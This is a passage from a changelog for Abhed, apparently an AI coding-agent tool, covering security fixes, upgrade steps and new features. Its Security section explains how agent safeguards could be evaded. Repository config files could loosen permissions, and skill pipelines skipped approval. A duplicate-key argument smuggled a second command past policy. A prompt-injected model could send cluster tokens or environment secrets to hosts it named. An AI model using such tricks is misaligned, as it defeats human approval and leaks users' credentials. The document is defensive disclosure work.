# Changelog

All notable changes to Abhed are recorded here. The format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and versions follow
[Semantic Versioning](https://semver.org/).

## [Unreleased]

### Security

- The interactive approval can no longer be answered by a key pressed as it
  appears. No key, arrows and Enter included, counts for the first 300 ms the
  question is on screen; a number counts only with 300 ms of quiet on either
  side, so typing or a key held down never answers; Enter needs 300 ms since
  the last arrow; and nothing is selected at first, so Enter alone answers
  nothing. Approvals are answered by number only, in the dialog and in the
  line mode alike: no letter approves. Only the answers offered can be
  chosen. A destructive command needs a second, numbered Yes, whose default
  is No.
- Text from the model, from tools, from the workspace (a git branch) and
  from a status line command is drawn with every control and format
  character removed, rune by rune, keeping only text and colour: C0 and C1
  controls, OSC, DCS and other escapes, bidi overrides and isolates,
  zero-width and tag characters. Conceal (SGR 8) is dropped from colour, and in
  what programs print, so is a colour that sets the text to its background's
  colour when both are explicit: printed text cannot be made invisible. Every row the terminal draws passes
  through the same filter, and so does everything the line mode prints on a
  terminal (piped input, `TERM=dumb`): its approvals, replies, tool output
  and what commands print. In an approval and in a diff nothing is dropped:
  hidden characters are shown as marked escapes (`⟨\r⟩`, `⟨U+200B⟩`), so a
  command cannot show one thing and run another. Tests send OSC 52, OSC 0,
  OSC 8, screen erases, C1 sequences and joiner-hidden controls through
  every field that reaches the screen, in the dialog and in the line mode,
  and find none of them on the wire.

- In every release up to and including 1.2.1, a repository could ship a
  `.abhed/config.json` that Abhed applied whole in every mode: the CLI,
  `-p`, `acp`, `rpc`, `serve` and `resolve`. Such a file
  could set bypass or auto mode, add allow rules, point a provider's
  `base_url` at another server so the code went there, start `extensions`
  and `mcp` processes, turn `sandbox.allow_network` on or lower
  `sandbox.min_tier`. A workspace's configuration is now untrusted until the
  person trusts its exact contents.
  - Trust is keyed by the workspace's canonical path and the SHA-256 of the
    file, and stored in `~/.abhed/trust.json`, which the agent's tools and
    every sandbox tier already keep the agent out of.
  - An untrusted file contributes only what tightens: deny and ask rules, a
    narrower mode, a stronger sandbox tier, network off, lower limits, a
    stricter syntax check, and turning features off. Every other setting is
    ignored and named on stderr and in `abhed doctor`.
  - Settings under `auth`, `storage` and `server`, whose defaults are the
    loosest values, fail closed: `serve`, `user` and `migrate` refuse to run
    without them.
  - Ignored values are shown with credentials redacted, and text from the
    file is escaped so it cannot draw lines of its own in the prompt.
  - The managed configuration still wins over everything, and the user's own
    `~/.abhed/config.json` is trusted as before.
  - Commands the agent runs on the host no longer inherit
    `ABHED_TRUST_WORKSPACE`.
  - The design and the classification of every setting are in
    `docs/architecture/workspace-trust.md`.
- A skill's pipeline ran its tool steps with no policy, approval or record.
  Affects every release from 0.1.0 through 1.2.1, in the CLI (`abhed` and
  `abhed -p`); the server, console and SDK never ran pipelines. A step called
  the tool directly, so deny and ask rules, plan mode, destructive-command
  confirmation, extension hooks, the monitor, the approver and the `secrets`
  allow rule were all skipped. A step could run `bash`, `write` or any other
  registered tool with arguments templated from the request and from earlier
  steps' output. File-tool path checks and a configured sandbox still
  applied. Nothing about the step reached the record, and a pipeline's model
  steps were sent tool output before secret values were stripped from it.
  Each tool step is now put through the loop that called the skill, as that
  loop's own call is: its policy, hooks, the monitor and the approver, one
  ask at a time across the session, and its session, depth and record. A
  pipeline a subagent starts is judged as that subagent, so a `task` step in
  it is a nested spawn and `nested_subagents` still applies. A step that
  needs approval in a headless run, or with no approver, is refused. Each
  step is recorded with `via` naming the skill's pipeline, which HawkEYE
  shows, and an approval prompt says which pipeline asks. A step's timeout
  starts once it is approved. Model steps and gates get their whole prompt
  with secrets redacted. A pipeline is refused rather than run when no
  session's `skill` call started it, when a step calls the `skill` tool, or
  when it would start beneath another pipeline's step, which bounds
  skill, pipeline and subagent recursion.
- A tool call's arguments could be read one way by policy and another by the
  tool. Policy took the subject from the exact key `command` (or `path`,
  `pattern`, ...), while the tools decode into Go structs, which match keys
  whatever their case and keep the last of a repeated key. So
  `{"command":"echo safe","Command":"touch x"}` was judged, shown for
  approval and recorded as `echo safe`, and ran `touch x`. The same held for
  `write`, `edit` and `read` paths, and a `command` key added to a `write`
  call was judged in place of its path. This got past deny, ask and allow
  rules and the destructive-command confirmation, in every mode, and a
  prompt-injected model can write such arguments. Affected: every release,
  0.1.0 through 1.2.1.
  - Arguments are now decoded once, strictly, before policy. A repeated key,
    two keys that differ only in case (at any depth, with case folded as Go
    folds it), data after the object, or arguments that are not an object
    are refused. Every tool refuses a key spelled like a declared one in
    another case, and an undeclared `command`, `path` or other key policy
    reads. `bash`, `read`, `write`, `edit`, `glob`, `grep` and `todo` drop
    any other key their schema does not name before policy, so they run
    exactly what was judged; the record names the keys dropped.
  - The accepted arguments are re-encoded once. Policy, hooks, the monitor,
    the approver, the record, the transcript and the tool, including what is
    sent to an MCP server or extension, all get those same bytes.
  - A refusal is recorded as a denial at step `args`. The request's `args`
    is `{}` and the arguments as sent are in its `raw_args`, as text, so a
    resumed session replays the call with arguments its provider accepts.
    The model is told the arguments were malformed. A resumed session also
    replays as `{}` any recorded arguments that are not one object.
  - `policy.Evaluate` also denies ambiguous arguments at step `args` for
    callers outside the loop, such as the workbench, and reads a lone key in
    another case as the tool would.
- Sessions started through the SDK did not redact stored secrets. In 1.2.1
  and earlier, `sdk.New` built its recorder with no redactor, so a value from
  the secrets store (`abhed secret`) that appeared in a tool's output, or in
  a call the model made, was kept as it was. This affected every session run
  on the SDK: embedded agents, `abhed acp`, `abhed rpc` and `abhed resolve`.
  The value could appear in:
  - the event record (`Events`, `ExportHTML`, the `rpc` export);
  - `OnEvent`, the `rpc` event lines and the `session/update` stream sent to
    an ACP editor;
  - ACP permission requests and the arguments passed to `Approve`;
  - the answer from `Run` and `rpc`, `ErrNoResult.LastMessage` from
    `RunJSON`, and the agent's messages that `resolve` prints;
  - the tool output sent back to the model.

  The terminal, the server and console, and `abhed eval` were not affected.
  SDK sessions now redact with the same store as the CLI, and there is no
  option to turn it off. A server built with no `Options.Redact`, or a
  subagent factory with no `Redact`, now redacts too: the server uses the
  secrets store, and the subagent redacts as its parent does. The `abhed`
  binary always set both, so this only affects a program that embeds these
  packages.
- A secrets store that existed but could not be loaded made every path, the
  CLI included, run with nothing to redact. That covers a store that was
  empty (0 bytes), corrupt, readable by others or unreadable. Now the
  terminal, the server, `eval`, `acp`, `rpc`, `resolve` and the SDK refuse
  to start with an error that names the file and the fix, and `abhed doctor`
  reports the store as not ready. A missing store still means no secrets.
  If the store breaks while `abhed serve` runs, each new session starts but
  withholds every event payload, and the server logs why, until the file is
  fixed; a server built with no `Options.Redact` does the same. See
  Upgrading.
- The store is now opened once and checked on the open file. A FIFO or
  device at its path is refused instead of blocking or reading without end,
  and a store over 1 MiB is refused.
- `abhed serve` read the store once at start, so a secret added while it ran
  was not redacted until a restart. Each server session now reads the store
  when it starts. CLI subagents redact with their conversation's reading
  rather than the one taken when the process started.
- The SDK's `Approve` is now given the decision's reason and scope redacted,
  as well as the arguments.
- `abhed secret set` refuses a value under 8 characters. A shorter value
  already stored still has its values redacted, but no longer has matching
  JSON object keys rewritten, which broke decoding events for SDK and `rpc`
  readers.
- A cluster login or SSH host added during a conversation belonged to the
  whole process, not the session. On `abhed serve`, where every user's
  sessions share one process, one user's `k8s_login` token became the
  credential every other user's `k8s_get` and `k8s_apply` used, and a host
  one session added with `ssh_connect` could be run on from every session,
  or replace an operator's host of the same name for all of them. The token
  was also an argument to `k8s_login`, so it was kept in the record's
  `action.requested`, and from there in exports, the event stream, the
  console, OTLP and HawkEYE, shown in the approval prompt, and sent back to
  the model on every turn. `k8s_login` also sent the token to whatever
  server URL the model gave, with TLS verification off, so a
  prompt-injected model could name its own host and a person approving
  what read as a login handed the token over. And `ssh_connect`'s
  `password_env` read any variable in Abhed's own environment, provider
  keys included, as the password for a host the model named, and
  `accept_host_key` let it go to whoever answered. Affected: every release,
  0.1.0 through 1.2.1.
  - A login and a connected host now belong to the conversation that made
    them, its subagents included. They are closed when the session is
    deleted, when the terminal starts another conversation with `/clear` or
    `/resume`, and when a conversation is forked. Both tools refuse when
    there is no session to hold them.
  - `k8s_login` takes `token_secret`, the name of a token stored with
    `abhed secret set`, instead of `token`; `ssh_connect` takes
    `password_secret` instead of `password_env`. Each name needs its own
    `secret(NAME)` allow rule, as a `bash` secret does. Rules apply to the
    whole deployment, so on `abhed serve` any session there may name a
    secret the rules allow; what is per session is the login made with it.
    The tools never ask the model for a value, so the record holds names.
  - A `token` or `password` sent anyway is dropped before policy reads the
    call, and a value where a secret's name belongs is recorded as
    `[withheld: not a secret name]`. Arguments to either tool refused as
    malformed are not kept in `raw_args`. A value the model writes where
    nothing expects one, such as in `cluster`, `namespace`, a dropped key's
    name, or a call to a tool this deployment does not have, is still
    recorded as written, as it already stands in the model's own reply;
    paste credentials into `abhed secret set`, not into the chat. The one
    exception is a call to an unknown tool whose name is, ignoring case,
    within one letter of `k8s_login`, `ssh_connect` or another tool that
    takes secrets, contains one of those names, or is within one letter of
    one behind a namespace such as `functions.`, `default_api.` or `mcp__x__`:
    its arguments are recorded as `[withheld: unknown credential tool]`.
  - `k8s_login` takes `cluster`, a name from the new `k8s.clusters`, instead
    of `server`. A URL or an undeclared name is refused before the secret is
    read or any request is made. TLS is verified against the system roots
    plus the cluster's `ca_file` or `k8s.ca_file`, and the server must be
    `https://`. A cluster's `insecure_skip_tls_verify` is config only and is
    named on stderr at start, in `abhed doctor`, in the `abhed serve` banner
    and in the approval prompt.
  - `k8s_get` and `k8s_apply` take `cluster`, a declared cluster the session
    logged in to. A login token goes only on that cluster's own client, never
    on a kubeconfig client, whose TLS settings and exec credential are not
    the ones approved. With one login and no `cluster` or `context`, the
    login is used; with several, the call must name one.
  - A session's logins close their connections when the session is
    deleted or a login is replaced, and idle connections time out.
  - `k8s.clusters` is checked when the configuration loads: names must be
    present and distinct ignoring case, and servers `https://` URLs.
  - The approval prompt's reason, and the new `target` field of
    `action.requested`, name the cluster and server a token goes to and how
    its certificate is checked.
  - `ssh_connect` sends a stored password only to a host whose key is
    already in `known_hosts`, and refuses one with `accept_host_key`.
  - `ssh_connect` refuses a name an operator's `ssh.hosts` entry uses, in
    any case, and a name that is not plain ASCII. The approval for an `ssh`
    command names the account and address it runs on, which is what to
    check: ASCII look-alikes such as `pr0d` still pass as names.
  - The approval for a `k8s_apply` write names the cluster, its server, and
    whether this session's login or a kubeconfig context's own credential
    is used. A user or password written into a server URL is left out, and
    the write goes to the server the approval named even if the kubeconfig
    changes in between. Building it runs nothing: a kubeconfig `exec`
    credential helper runs when a request is first sent, so a call that is
    denied, refused in plan mode or rejected runs no helper.
  - The kubeconfig, `ABHED_K8S_TOKEN` and `ssh.hosts`, `password_env`
    included, are the operator's configuration and work as before.

### Upgrading

- `tasks` with `"isolation": "worktree"` now counts as a mutating call: it
  asks in default mode, is refused in plan mode, and is refused where nobody
  can be asked (`-p`, `rpc`, unattended server runs) unless an allow rule
  names `tasks`. A script that relied on `-p` making worktrees needs
  `-allow tasks` or the rule in its configuration.
- `abhed rpc` and `abhed acp` sessions now have the CLI's tool set: they
  start the MCP servers and extensions a trusted workspace configuration
  names, load its skills, and can run subagents. A CI job on `abhed rpc`
  whose configuration names a server or extension it never started before
  now starts it.
- `Postgres.CreateSubagentSession` records a subagent's row with its
  parent session's id; `CreateSubSession` is unchanged and records none.
  `ListSessions` leaves out rows with a parent
  and returns `ParentID`; deleting a session marks its subagents' rows
  deleted too.
- With no `allowed_hosts`, each `web_fetch` call asks in the default,
  accept-edits, auto and plan modes unless an allow rule such as
  `web_fetch(https://docs.python.org/*)` matches, since a URL can carry data
  to any site; "always allow" is offered for any URL on the site. Bypass
  (unless a managed policy disables it) runs it, a run with no one to ask
  refuses it, and `abhed eval`, which approves every ask, fetches. With `allowed_hosts` set, calls to those
  hosts do not ask on the scheme's default port; a URL naming another port
  asks.
- `url` is now a policy subject for MCP and extension tools. A tool whose
  only subject-like argument is `url` is matched on that URL, so deny and
  ask rules written as `mcp__x(https://…/*)` that never fired now do, and an
  allow rule written that way now approves calls it did not before. Re-read
  such rules before upgrading.
- An argument named `url` that a tool's schema does not declare is now
  refused, as the other subject keys are, rather than passed through.
- ACP editors must answer a permission request with one of the option ids it
  offers. The ids are no longer the fixed `once`, `always` and `reject`; they
  are bound to the request, and any other answer is refused. An editor that
  picks from the offered options, as the protocol intends, needs no change.
- A cancelled or unreadable ACP editor reply is now recorded `by: system`
  with its reason, not as a reviewer's denial. A request whose recorded copy
  was withheld is refused without asking and recorded the same way.
- An ACP editor that read the tool name from a `tool_call` update's root
  `name` field reads it from `_meta["zybuu.ai/abhed"].tool`. The spec does not
  allow custom root fields.
- A secrets store that exists but cannot be loaded now stops sessions from
  starting: the terminal and `-p`, `abhed serve`, `eval`, `acp`, `rpc`,
  `resolve` and `sdk.New` all refuse. Before upgrading, run `abhed doctor`
  from 1.2.2: it reports the store and exits 1 without starting anything.
  The fix depends on the case:
  - readable by others: `chmod 600` the file;
  - empty (0 bytes), as `touch ~/.abhed/secrets.json` leaves it: write `{}`
    to it or delete it;
  - not valid JSON, over 1 MiB, or not a regular file: fix it, or remove it
    and add the secrets again with `abhed secret set`.
- An editor using `abhed acp`, and a CI job running `abhed rpc` or
  `abhed resolve`, now fails at start over such a store where it used to
  run. The editor's log or the job's output shows the message.
- Embedders:
  - `sdk.New` can return this error.
  - `Approve` now receives the arguments, reason and scope with stored
    values redacted.
  - What `Run`, `RunJSON` and `RunStructured` return is redacted. A redacted
    structured answer may no longer match a `pattern`, `enum` or length in
    the caller's schema, and one whose redaction fails comes back as
    `{"withheld": ...}`, which will not decode into the caller's type.
  - A program that builds `server.Options` or an `agent.SubagentFactory`
    without `Redact` now redacts.
- `abhed secret set` refuses a value under 8 characters. Values already
  stored keep working.
- Workspace configuration files are untrusted after the upgrade, including
  ones you wrote yourself. Until you trust a workspace's
  `.abhed/config.json`, only its tightening settings apply, and a warning
  names every setting that was ignored. The first interactive `abhed` in each
  such workspace asks once, lists what the file would change, and offers to
  trust it, not trust it, or show it. Elsewhere:
  - Run `abhed trust` in the workspace to see the file and what it would
    change, then `abhed trust grant` to trust it.
  - A deployment or CI job that keeps its settings (storage, auth, providers,
    MCP servers, extensions) in the workspace file must either run `abhed
    trust grant` once as the user it runs as, or start with
    `-trust-workspace` (before the subcommand, or as the first argument
    after it) or
    `ABHED_TRUST_WORKSPACE=1`. If an untrusted file sets anything under
    `auth`, `storage` or `server`, `abhed serve`, `abhed user` and `abhed
    migrate` refuse to start and say how to go on, rather than run with no
    sign-in or an in-memory record. Every other command goes on without
    the ignored settings, with a warning on stderr: a headless run (`-p`,
    `rpc`, `acp`, `resolve`) uses the built-in or user default model and
    endpoint instead of the file's, without its MCP servers and extensions,
    and in the default mode instead of the file's. A CI job can therefore
    run a different model with fewer tools and still exit 0. A failed run
    repeats that the file's model settings were ignored.
  - Grants are stored in `~/.abhed/trust.json` of the user who runs Abhed.
    In a container or CI runner whose home directory does not persist, a
    grant is lost with it: use `-trust-workspace` or
    `ABHED_TRUST_WORKSPACE=1` for that step, or move the settings to the
    managed file. Set the variable for a single step, not in a shell
    profile.
    Settings kept in `~/.abhed/config.json` or the managed
    `/etc/abhed/config.json` are unaffected.
  - Editors on ACP: `session/new` now reports the decision in
    `_meta.abhed.workspaceTrust`.
- SDK: a `ConfigDir` file is untrusted in the same way, so an embedding
  program that keeps its providers, MCP servers or extensions there loses
  them, with a line on stderr (or, for the model, an error from `New`),
  until it trusts the file. Set
  `Options.WorkspaceTrust` to `config.TrustGranted` when the program owns
  that file, or trust it once with `abhed trust grant`.
  `Agent.WorkspaceTrust()` reports the decision and what was ignored. When
  the ignored settings include the model and no `Options.Provider` is given,
  `New` returns `ErrUntrustedModel` instead of running on another model;
  set `Options.AllowDefaultModel` to run on the default anyway.
- A permission rule that does not parse now stops every command from
  loading the configuration. `serve` and `resolve` used to drop it, and every
  rule after it in the same list, without a word. Check with `abhed doctor`
  before restarting a server, so a bad rule is found before it refuses to start.
- The default configuration asks before a bash command that mentions
  `ABHED_TRUST_WORKSPACE` or `trust-workspace`. A configuration that sets
  its own `permissions.ask` list replaces these.
- `abhed init` trusts the file it writes. After an edit, trust it again.
- Tool calls whose arguments repeat a key, spell a key two ways, or carry an
  argument policy reads that the tool does not declare are now refused at
  step `args`, and the model is asked to retry. Extra keys the built-in
  tools do not take, such as `timeout` on `bash` or `file_path` on `read`,
  are dropped rather than refused and listed in the request's
  `dropped_args`. An MCP or extension tool whose schema sets
  `additionalProperties: false` now has undeclared keys refused.
- `action.requested` gains `raw_args` and `dropped_args`.
- Skill pipelines (up to 1.2.1 only the CLI ran them): a tool step that
  policy would ask about is refused in `abhed -p` and anywhere else with no
  approver, so a CI job whose pipeline runs such steps needs allow rules for
  them. A pipeline that calls the `skill` tool, runs with no calling loop,
  or would start beneath another pipeline's step is refused, and the skill
  falls back to its instructions.
  A step's timeout now starts after its approval.
- `k8s_login` no longer accepts a token, and `ssh_connect` no longer accepts
  `password_env`. Store the credential once on the machine Abhed runs on,
  add a rule for it, and give the agent its name:
  ```
  abhed secret set OCP_TOKEN
  "allow": ["secret(OCP_TOKEN)"]
  ```
  Then ask the agent to log in to the cluster by name. A token pasted into
  a chat is still in that message's record; store it instead. On `abhed
  serve`, secrets are the operator's, so users ask the operator to store
  one, and any session on the deployment may name a secret the rules allow;
  a login made with it holds for that session only. Log in again in each
  new session, after `/clear`, `/resume` or a fork in the terminal, and
  after a server restart.
- `k8s_login` reaches only clusters declared in `k8s.clusters`, and takes
  `cluster` (a name) instead of `server`. With none declared it refuses.
  Declare each cluster people log in to, with its CA if the system roots do
  not verify it:
  ```json
  "k8s": {"clusters": [{"name": "prod",
                        "server": "https://api.prod.example.com:6443",
                        "ca_file": "/etc/abhed/prod-ca.pem"}]}
  ```
  A cluster whose certificate verified nothing before, such as an OpenShift
  lab with a self-signed CA, now fails the login with a certificate error
  until its CA is configured, or until the operator sets
  `insecure_skip_tls_verify` on it. Clusters in an untrusted workspace
  `.abhed/config.json` are ignored. A configuration whose clusters repeat a
  name, leave one empty, or give a server that is not `https://`, or that
  carries a user or password, is refused when it loads.
- After a login, `k8s_get` and `k8s_apply` given a kubeconfig `context` use
  the kubeconfig's own credential, not the login. Name the logged-in
  cluster as `cluster` instead. A session logged in to several clusters
  must name one on each call.
- A host added with `ssh_connect` is usable only in the session that added
  it, and a name used in `ssh.hosts`, in any case, cannot be reused for
  one, nor can a name that is not plain ASCII. A password
  needs the host's key in `known_hosts` first; connect once with `ssh`, or
  use a key file.
- `action.requested` gains `target`.
- A kubeconfig `exec` credential helper now runs when Abhed first sends a
  request to that cluster, not when the context is opened. `abhed doctor`
  and the `abhed serve` banner no longer run it, so a helper that fails is
  reported by the first cluster call instead.
- `abhed serve` now starts the configured extensions; their veto applies to
  every console and workbench session, and their tools are offered there.
- Embedders: `limits.max_budget_tokens`, `limits.max_tokens`,
  `context.compact_at` and `context.offload_at` now apply. With
  `Options.ConfiguredTools` the built-in prompt carries the workspace's
  `ABHED.md` memory files, as the CLI's does; without it, as before, it
  carries none. `abhed rpc` and `abhed acp` set it.
- SDK: `Agent.Fork` returns `ErrForkDuringRun` while `Run`, `Continue`,
  `RunJSON` or `RunStructured` is in progress. A fork ends the session's
  logins and rewrites the conversation, so it must come after the run returns.

### Fixed

- `abhed acp`: a permission request's `toolCallId` is now the id of the
  `tool_call` it asks about, and that `tool_call` is sent first. The id was
  derived from the tool name and argument length, so it matched no tool call
  and two calls could share it.
- `abhed acp`: an answer is bound to its request. An answer naming an option
  not offered for that call, including *Always allow* where it was withheld
  (which approved once before), is refused. A refused, cancelled or unreadable
  answer is recorded as refused by the system, not as a reviewer's rejection.
- `abhed acp`: a call the model wrote as prose, which has no call id, is
  named by its `requestId` in its `tool_call`, permission request and
  updates. Such calls all had the id `""`.
- The SDK's `RunJSON` and `RunStructured` never delivered a result: the loop
  runs on its own copy of the tool registry, and the `result` tool was added
  to the original, so every run ended with `ErrNoResult`. This dates from
  1.0.0.
- `abhed resolve` could close its session before it printed the agent's last
  messages, so they were lost. It now waits for them, as `rpc` and `acp` do.
- `abhed serve` did not start the configured extensions, so their veto did
  not apply to console or workbench sessions and their tools were missing.
- The SDK's `todo` tool recorded nothing, so an ACP editor's plan panel never
  updated. It now records `todo.updated` on every surface.
- The CLI's subagents spent from a budget of their own, apart from the
  session's, so `limits.max_budget_tokens` did not count their spend against
  the conversation and the conversation's against them. There is now one
  budget, and a subagent stops when it runs out rather than after.
- A subagent's `todo` list replaced its parent's; it is now kept in the
  subagent's own record.
- A skill reloaded in the server's settings reached the next session's
  prompt but not its `skill` tool, which kept the skills loaded at start.
- A CLI subagent's session row in Postgres did not name its parent, so it
  was listed as a session of user `agent`, and deleting the conversation
  left it behind.
- `tasks` ran a task naming an unknown `agent_type` as the general role; it
  now refuses the call before anything runs, as `task` does.
- A `task` call's `max_turns` could exceed `limits.max_turns`; a subagent's
  cap is now never above its parent's.
- The parent loop's own asks now share the one-at-a-time queue its
  subagents use, so a person is never asked two things at once by the tree.
- On the server, an approval that ended always set the session to
  `running`, even when no run was live; it now restores `running`, `idle` or
  `done` as fits. A message sent while an ask was pending and no run was
  live was queued as steering into a loop that was not running; it now
  starts a run.
- A server process that died mid-run left its session's row open, and no
  node could ever continue it. The next message to such a session now takes
  it over, when no live node holds it, and records the ends the crashed
  process never wrote (`recovered`; lost background tasks as `lost`).
- Continuing a session elsewhere reset its token and spawn allowance; the
  budget now goes on from what its record says it spent.
- A server turn continued by a message never refreshed or released this
  node's claim on the session; every run now holds it, with its heartbeat,
  while it or a background task is live.

### Added

- The interactive CLI is rebuilt around an input box that stays on screen
  while the agent works ([The terminal](docs/guide/18-terminal.md)):
  - Replies stream as they are written, formatted as they arrive: headings,
    lists, emphasis, tables, and highlighted code blocks that stay blocks
    when they arrive in pieces. Prose wraps between words.
  - Multi-line messages (Shift+Enter, Alt+Enter, Ctrl-J, `\` then Enter);
    a large paste is one placeholder and one message; history is kept per
    workspace, with Ctrl-R search; shell editing keys, undo, `$EDITOR` with
    Ctrl-G, and optional vim editing (`/vim`).
  - Accented letters, CJK, emoji and flags are typed, measured and deleted
    as the characters they are.
  - Tool calls show the first and last lines of their output, and edits and
    writes a diff with line numbers and context, in every mode; Ctrl-O shows
    the whole transcript with everything in full. Paths are relative to the
    workspace.
  - Approvals are a numbered dialog that shows the change, why it is asked,
    the policy step, and who asked; it stays in the transcript with the
    answer.
  - A footer shows the permission mode, the model, how full the context
    is, the session's tokens, background tasks and the git branch;
    `statusline.command` replaces its second row with a command's output.
  - Shift-Tab steps through default, accept-edits and plan, never auto or
    bypass.
  - Dark, light, high-contrast and colour-blind themes, chosen from the
    terminal's background or with `/theme`.
  - The Surface the slash commands draw and ask through is the terminal:
    blocks, guarded dialogs, pickers and full-screen panels.

- Configuration keys for the interactive CLI: `statusline.command`, which
  the footer runs, and, reserved, `cli.mode_cycle`, `commands.dirs`,
  `rules.dirs`, `memory.auto`, `memory.import_depth`, `record.dir`,
  `record.retention_days` and `hooks.disabled`. The reserved ones are
  accepted so a file that sets them stays valid, but this version does not
  act on them yet: setting one prints "set but not
  yet in effect in this version", and `abhed doctor` reports it and does not
  call the configuration ready. Who may set each is already enforced.
  `cli.mode_cycle`, `record.*` and `hooks.disabled` are managed only: the
  user's file or a workspace's is set aside with a warning. A workspace may
  only turn `memory.auto` off, trusted or not, and auto memory is off unless
  turned on. `commands.dirs`, `rules.dirs` and `statusline` in a workspace
  need trust.
- `abhed acp`: an editor can list the configured models and switch between
  them mid-session. `session/new` returns a `configOptions` model selector
  (category `model`), and `session/set_config_option` switches it, answering
  with the full options. Editors on the older
  unstable API get `models` in `session/new` and `session/set_model`. Each
  choice is a configured provider's name, described by its model id and
  type, never its endpoint or key. Only providers a trusted configuration
  defines are offered, and a managed `model.default` pins the model. A
  switch is refused while a prompt runs, for an unknown name, and for a
  provider whose `api_key_env` is unset, naming the variable. It is recorded
  as `model.switched`.
- SDK: `Agent.Models` and `Agent.SwitchModelNamed` list and choose the
  configured models by name, with `ErrUnknownModel` and `ErrSwitchDuringRun`.
- Background subagents. `task` and `tasks` take `background: true`: the
  call returns at once, the task outlives the run, and its result comes back
  as a `subagent.notice` (recorded first, untrusted, redacted), delivered as
  a `task_status` call and result, never as the person's message.
  `subagents.wake` (`off`, `notify` by default, `auto`) says what a result
  does while the session is idle; `auto` runs a short wake run
  (`session.woken`, `wake_limit`) within `subagents.max_wakes_per_hour` and
  `subagents.wake_max_turns`. `-p`, eval and unattended runs join their
  tasks; editors, rpc and the SDK never wake on their own. New limits
  `limits.max_background_subagents` (4) and `limits.background_max_minutes`
  (60, at most 480). New tools `task_status` and `task_cancel`. An explicit
  stop cancels every background task; "send now" keeps them.
- Resuming a finished subagent: `task` takes `resume`, a task id of this
  session's, and continues that subagent's own conversation with a new
  prompt, on the model it ran on, in its worktree, under its role as it is
  now.
- Server: the session state `background`; `GET /v1/sessions/{id}/tasks`,
  `POST /v1/sessions/{id}/tasks/{task}/cancel` and `POST
  /v1/sessions/{id}/wake`, owner only; the session list's `background` and
  `pending_ask`; `Options.OwnerActive`. The console and workbench draw
  background results, wakes and the closing end, and list background counts
  and waiting approvals. `session.ended` gains `background`, `settled` and
  `recovered`; in Postgres a session with background tasks running keeps its
  row open until the closing end, and a store may implement `ClaimOrphan`.
- CLI: results drawn at the prompt, `/tasks`, `/wake`; Ctrl-C twice at the
  prompt cancels background tasks. rpc: `start.wake`, `tasks`,
  `cancel_task`, `wake`. SDK: `Options.Background`, `Background`,
  `CancelTask`, `CancelTasks`, `WaitBackground`, `Wake`,
  `ErrNothingToWake`. ACP: a card per background task; an ask made between
  prompt turns waits for the next one.

- `abhed acp`: a permission request's `toolCall._meta["zybuu.ai/abhed"]`
  carries the `tool`, the policy `step`, `reason`, `destructive`, `scope` and
  `requestId`. `destructive` is true for any command with no undo, whichever
  step asked. The title, `rawInput` and reason shown are the recorded copy.
- SDK: `CallIDOf` and `RequestIDOf` name, inside `Options.Approve`, the call
  and the recorded request being asked about.
- `abhed trust` shows, grants, revokes and lists trust decisions;
  `abhed trust grant -sha256 H` grants only the content that was reviewed.
  `-trust-workspace` trusts the workspace file for one run.
- ACP `session/new` reports `_meta.abhed.workspaceTrust` and accepts
  `_meta.abhed.trust: "untrusted"`. The rpc `ready` event carries
  `workspace_trust`. The SDK adds `Options.WorkspaceTrust` and
  `Agent.WorkspaceTrust()`, and the config package adds `LoadWith`,
  `InspectWorkspace`, `GrantTrust`, `DeclineTrust`, `RevokeTrust`,
  `InitWorkspace`, `Printable`, `PrintableText` and `PrintableURL`.
- The record's `action.requested` carries `raw_args` (refused arguments as
  text) and `dropped_args` (keys a built-in tool dropped); the SDK's
  `ActionRequested` gains `RawArgs` and `Dropped`. Refusals of malformed
  arguments are recorded at the new policy step `args`.
- The record's `action.requested` carries `via` when the harness issued a
  call for the agent, such as `skill research pipeline`; the SDK's
  `ActionRequested` and HawkEYE's `calls[].via` show it, and an approval
  prompt names the pipeline that asks.
- Subagents (`task`, `tasks`) in the console and workbench, `abhed rpc`,
  `abhed acp` and the SDK, with the CLI's guarantees: the parent session's
  policy judges each call, the budget and `limits.max_parallel_subagents`
  are the session's, worktrees are made in the session's workspace, and
  `subagent.*` events are in the parent's record. A subagent's ask goes to
  whoever the session asks: the person in the console, on the parent
  session's prompt; the ACP editor's permission dialog; the SDK's `Approve`.
  With nobody to ask (an unattended server run, `rpc`, an SDK agent without
  `Approve`) it is refused. On a server with durable storage a subagent's
  session row is its parent's owner's, names the parent, and is not listed.
- `subagent.ask` in the parent's record: a subagent's call waiting on the
  approver, with the call, reason, scope and the `request_id` an answer
  names. `subagent.action` gains `request_id`.
- Skill pipelines run in console and workbench sessions, their steps put
  through the session's loop as from the CLI.
- SDK: `Options.ConfiguredTools` gives an embedded agent the CLI's tool set as
  the configuration enables it: subagents, MCP servers, extension tools,
  skills and pipelines, web search, the code index, rag corpora, Kubernetes
  and SSH. Off by default; `abhed rpc` and `abhed acp` turn it on.
- `abhed acp`: a subagent's ask is a permission request on a `tool_call`
  named `subagent-<request id>`, sent first, and its answer settles that call.
- `server.Options.Extensions` puts running extensions' veto and compaction
  summary on every session. The capabilities list names `task` and `tasks`,
  and gives each configured extension's `status` (`running`, `stopped` or
  `not started`); the serve banner names one that is not running.
- The console and workbench say on a subagent's approval card that *Always
  allow* covers the whole session, the agent and every subagent.
- `web_fetch`: reads one http or https page through Abhed, not the
  sandboxed shell, and returns its text (HTML reduced to headings,
  paragraphs, lists and links), in parts of up to `web_fetch.max_chars`
  characters. Off by default and enabled on its own with
  `web_fetch.enabled`; `web_fetch.allowed_hosts` limits it to named hosts.
  It refuses other schemes, any loopback, private, link-local, metadata or
  reserved address (checked where it connects, on every redirect hop), a
  URL holding a stored secret in any case, and a URL not written in its one
  form: no surrounding spaces; a port as a plain number, the default left
  out; an address as four decimal numbers or compressed IPv6, never IPv4 as
  IPv6 or as one number, and no host ending in a number that is not an IPv4
  address; and no `.`, `..`, empty, dots-only or control-character path
  segment, raw or encoded, and no encoded slash. So a rule on a host or port
  cannot be stepped around by respelling it, nor a rule on a path prefix by
  dot, encoding or Unicode respellings; path rules still match
  case-sensitively and a query exactly as written. `web_fetch(http*://host/*)`
  covers both schemes. A redirect to anything but the same URL (or its
  https upgrade) is handed back as a new call. Policy rules match the URL:
  `url` is now a subject key.
- Subagents in the console, `abhed rpc`, `abhed acp` and the SDK use the
  cluster logins and connected hosts of the session that started them,
  never another session's. The SDK's `Close`, a new `start` on `abhed rpc`
  and the end of an `abhed acp` connection close the ones an embedded agent
  made.
- `subagent.ask` carries the subagent's `target`: where its call sends a
